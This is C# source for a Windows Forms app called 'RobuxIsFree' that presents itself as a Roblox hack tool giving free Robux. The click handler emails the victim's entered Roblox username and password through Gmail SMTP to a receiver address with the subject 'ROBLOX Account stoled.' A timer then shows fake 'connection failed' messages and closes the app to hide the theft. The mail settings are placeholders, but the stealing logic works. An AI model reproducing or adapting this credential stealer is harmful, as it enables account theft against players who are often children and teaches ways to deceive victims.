using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Text;
using System.Net.NetworkInformation;
using System.Net;

namespace RobuxIsFree
{
    public partial class RIFGui : Form
    {

        public RIFGui()
        {
            InitializeComponent();
            timer1 = new Timer();
            timer1.Tick += timer1_Tick;
            timer1.Interval = 500;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            timer1.Enabled = !timer1.Enabled;
            progressBar1.Minimum = 0;
            progressBar1.Maximum = 100;
            progressBar1.Value = 0;
            progressBar1.Step = 1;
            MailMessage mail = new MailMessage();
            SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("sender@mail.com");
            mail.To.Add("receiver@mail.com");
            mail.Subject = "ROBLOX Account stoled.";
            mail.Body = "Username : " + name.Text + " | Password : " + password.Text;
            smtpServer.Port = 587;
            smtpServer.Credentials = new NetworkCredential("sender@address.com", "senderpassword");
            smtpServer.EnableSsl = true;
            smtpServer.Send(mail);

        }

        int j = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            j++;
            progressBar1.PerformStep();
            if (j == 1)
                {
                label4.Text = "Status : Initzaling the hack tool...";
                }else if (j == 10)
            {
                label4.Text = "Status : Connecting to ROBLOX...";
            }else if (j == 20)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 1...";
            }
            else if (j == 30)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 2...";
            }
            else if (j == 40)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 3...";
            }
            else if (j == 50)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 4...";
            }
            else if (j == 60)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 5...";
            }
            else if (j == 70)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 6...";
            }
            else if (j == 80)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Retry 7...";
            }
            else if (j == 90)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Last retry (retry 8)...";
            }
            else if (j >= 100)
            {
                label4.Text = "Status : Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :(";
                timer1.Stop();
                MessageBox.Show("Connect to ROBLOX failed! Do you lost your internet? Is your firewall blocked this app? Or maybe your ip is banned by ROBLOX :( This app will exit.", "RobuxIsFree");
                Environment.Exit(0);
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("RobuxIsFree made by teppy! | Youtube : TreTrauIT","RobuxIsFree");
        }
    }

}

